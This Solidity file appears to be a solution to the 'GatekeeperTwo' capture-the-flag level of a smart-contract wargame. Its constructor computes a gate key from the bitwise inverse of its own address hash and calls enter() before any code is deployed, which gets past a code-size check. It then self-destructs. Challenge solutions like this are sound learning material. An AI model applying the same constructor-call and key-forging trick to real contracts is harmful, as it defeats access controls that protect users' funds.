// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperTwo {
    constructor(address target){
        bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        IGatekeeperTwo(target).enter(gateKey);
        selfdestruct(payable(address(0)));
    }
}
